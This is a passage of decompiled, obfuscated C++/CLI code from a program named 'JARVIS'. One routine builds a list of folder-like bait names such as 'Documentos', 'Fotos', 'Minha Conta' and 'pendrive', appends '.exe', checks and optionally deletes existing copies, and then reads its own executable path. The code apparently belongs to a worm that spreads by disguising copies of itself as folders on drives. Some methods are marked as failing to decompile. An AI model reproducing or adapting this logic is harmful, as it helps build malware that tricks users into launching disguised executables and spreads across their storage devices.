      \u003CModule\u003E.__ehvec_dtor((void*) obj0, 16U, *(int*) runtimeExceptionPtr, (__FnPtr<void (void*)>) __methodptr(JARVIS\u002ERuntimeException\u002E\u007Bdtor\u007D));
      if (((int) _param1 & 1) != 0)
        \u003CModule\u003E.delete\u005B\u005D((void*) runtimeExceptionPtr);
      return (void*) runtimeExceptionPtr;
    }
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bdtor\u007D((exception*) obj0);
    if (((int) _param1 & 1) != 0)
      \u003CModule\u003E.delete((void*) obj0);
    return (void*) obj0;
  }

  internal static unsafe void JARVIS\u002ERuntimeException\u002E\u007Bdtor\u007D(
    [In] RuntimeException* obj0)
  {
    \u003CModule\u003E.std\u002Eexception\u002E\u007Bdtor\u007D((exception*) obj0);
  }

  internal static void zfUNiNlXhZbFq(
    basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* dst)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static unsafe void aodzAlwiFpdp(sbyte* buffer, int* ip) => \u003CModule\u003E.sprintf(buffer, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0M\u0040PCENNPGA\u0040\u003F\u0024CFd\u003F4\u003F\u0024CFd\u003F4\u003F\u0024CFd\u003F4\u003F\u0024CFd\u003F\u0024AA\u0040, __arglist (*ip, ip[1], ip[2], ip[3]));

  internal static int BeDhd(int s, int e) => \u003CModule\u003E.rand() % (e - s + 1) + s;

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool llNOzMjObj(
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* dirName_in)
  {
    uint fileAttributesA = \u003CModule\u003E.GetFileAttributesA(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(dirName_in));
    return fileAttributesA != uint.MaxValue && (~(int) (fileAttributesA >> 4) & 1) != 0;
  }

  internal static unsafe basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* hwAYOEKvSX(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    sbyte* path,
    [MarshalAs(UnmanagedType.U1)] bool overrideFile)
  {
    uint num1 = 0;
    \u0024ArrayType\u0024\u0024\u0024BY0CI\u0040PAD arrayTypeBy0CiPad;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref arrayTypeBy0CiPad = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_05CPJKMGFC\u0040Fotos\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 4) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0L\u0040DLJBJIAN\u0040Importante\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 8) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0L\u0040GEMFLCBF\u0040Documentos\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 12) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_08LCHFGBEB\u0040Arquivos\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 16) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_09HECLFCNM\u0040Registros\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 20) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_09PCGBLHCJ\u0040Relatorio\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 24) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_07OOKPOBEB\u0040Sistema\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 28) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0P\u0040BNFNGMOL\u0040Dados\u003F5Trabalho\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 32) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0L\u0040EPEGFDJP\u0040Wallpapers\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 36) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_05JPKIAOHJ\u0040Disco\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 40) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_05BEBFLIBD\u0040Erros\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 44) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BB\u0040LFILMENC\u0040PDFs\u003F5Importantes\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 48) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0O\u0040DNIHOJOC\u0040Mais\u003F5Arquivos\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 52) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0P\u0040DNABKGMA\u0040Para\u003F5Verificar\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 56) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0M\u0040JMFPCLPB\u0040Minha\u003F5Conta\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 60) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0L\u0040CKHKCMEB\u0040Meus\u003F5Dados\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 64) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BG\u0040OAKOPLJH\u0040Arquivos\u003F5e\u003F5Documentos\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 68) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_06DNBPDGPM\u0040Backup\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 72) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0M\u0040ILLKBPFF\u0040importa\u003Fg\u003Fues\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 76) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0N\u0040LDEAMGGL\u0040configura\u003Fg\u003Fco\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 80) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_06ECAOGEFD\u0040ativos\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 84) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_07CNDAOIPJ\u0040Objetos\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 88) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_06BNEHDFHO\u0040Photos\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 92) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_09MCGAFAPH\u0040Important\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 96) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_09IBGBKIMC\u0040Documents\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 100) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_05DIOAMJFE\u0040Files\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 104) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_09KNBLANNJ\u0040Registers\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 108) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_07NCMMNIJM\u0040Reports\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 112) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_06JIODDOFH\u0040System\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 116) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_05NAOIJFC\u0040Error\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 120) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_07DMAJFAJO\u0040actives\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 124) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0L\u0040OBHDNIJO\u0040my\u003F5account\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 128) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_07GPFJNOLD\u0040my\u003F5data\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 132) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BA\u0040DAHKIDJI\u0040important\u003F5files\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 136) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0L\u0040NHEGCEPP\u0040more\u003F5files\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 140) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_04MDPPAFID\u0040disk\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 144) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_08EEJLIFID\u0040my\u003F5works\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 148) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_07PAINMLEO\u0040Objects\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 152) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FDJHENA\u0040Desktop\u003F\u0024AA\u0040;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &arrayTypeBy0CiPad + 156) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_08LEHIHMIJ\u0040pendrive\u003F\u0024AA\u0040;
    int num2 = \u003CModule\u003E.rand() % 40;
    basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
    \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar1, 3, 1);
    // ISSUE: fault handler
    try
    {
      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar1 + 8), path), (sbyte*) ^(int&) (num2 * 4 + (IntPtr) &arrayTypeBy0CiPad)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04JLMDILM\u0040\u003F4exe\u003F\u0024AA\u0040);
        \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar2);
        // ISSUE: fault handler
        try
        {
          int num3 = 0;
          basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
          do
          {
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar3, 3, 1);
            // ISSUE: fault handler
            try
            {
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar3 + 8), path), (sbyte*) ^(int&) (num3 * 4 + (IntPtr) &arrayTypeBy0CiPad)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04JLMDILM\u0040\u003F4exe\u003F\u0024AA\u0040);
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar4;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr1 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar3, &stdAllocatorChar4);
              bool flag;
              // ISSUE: fault handler
              try
              {
                uint fileAttributesA = \u003CModule\u003E.GetFileAttributesA(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr1));
                flag = fileAttributesA != uint.MaxValue && (~(int) (fileAttributesA >> 4) & 1) != 0;
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar4);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar4);
              if (flag)
              {
                if (overrideFile)
                {
                  basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar5;
                  basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr2 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar3, &stdAllocatorChar5);
                  // ISSUE: fault handler
                  try
                  {
                    \u003CModule\u003E.remove(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr2));
                  }
                  __fault
                  {
                    // ISSUE: method pointer
                    // ISSUE: cast to a function pointer type
                    \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar5);
                  }
                  \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar5);
                }
                else
                  goto label_15;
              }
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar3);
            }
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar3);
            ++num3;
          }
          while (num3 < 40);
          goto label_22;
label_15:
          // ISSUE: fault handler
          try
          {
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar3, obj0);
            num1 = 1U;
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar3);
          }
          \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar3);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
      return obj0;
label_22:
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          allocator\u003Cwchar_t\u003E allocatorWcharT1;
          allocator\u003Cwchar_t\u003E* allocatorWcharTPtr = \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT1);
          allocator\u003Cwchar_t\u003E allocatorWcharT2;
          \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT2, allocatorWcharTPtr);
          void* voidPtr = \u003CModule\u003E.@new(4U);
          _Aux_cont* auxContPtr1 = (_Aux_cont*) voidPtr;
          vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT1;
          _Aux_cont* auxContPtr2;
          // ISSUE: fault handler
          try
          {
            if ((IntPtr) voidPtr != IntPtr.Zero)
            {
              *(int*) voidPtr = (int) &stdAllocatorWcharT1;
              auxContPtr2 = (_Aux_cont*) voidPtr;
            }
            else
              auxContPtr2 = (_Aux_cont*) 0;
          }
          __fault
          {
            \u003CModule\u003E.delete((void*) auxContPtr1, voidPtr);
          }
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ref stdAllocatorWcharT1 = (int) auxContPtr2;
          // ISSUE: fault handler
          try
          {
            \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D((allocator\u003Cwchar_t\u003E*) ((IntPtr) &stdAllocatorWcharT1 + 8), allocatorWcharTPtr);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Container_base_aux_alloc_real\u003Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
          }
          // ISSUE: fault handler
          try
          {
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) = 0;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) = 0;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 20) = 0;
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Vector_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
          }
          // ISSUE: fault handler
          try
          {
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            int num4 = ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) >> 1;
            uint moduleFileNameW;
            do
            {
              uint _Newsize = (uint) (num4 + 260);
              \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eresize(&stdAllocatorWcharT1, _Newsize, char.MinValue);
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              uint num5 = (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) >> 1);
              moduleFileNameW = \u003CModule\u003E.GetModuleFileNameW((HINSTANCE__*) 0, \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eat(&stdAllocatorWcharT1, 0U), num5);
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              num4 = ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) >> 1;
            }
            while (moduleFileNameW >= (uint) num4);
            \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eresize(&stdAllocatorWcharT1, moduleFileNameW, char.MinValue);
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            char* chPtr1 = (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16);
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) > (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16))
              \u003CModule\u003E._invalid_parameter_noinfo();
            _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT2;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ref stdAllocatorWcharT2 = ^(int&) ref stdAllocatorWcharT1;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ((IntPtr) &stdAllocatorWcharT2 + 4) = (int) chPtr1;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            char* chPtr2 = (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12);
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) > (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16))
              \u003CModule\u003E._invalid_parameter_noinfo();
            _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT3;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ref stdAllocatorWcharT3 = ^(int&) ref stdAllocatorWcharT1;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ((IntPtr) &stdAllocatorWcharT3 + 4) = (int) chPtr2;
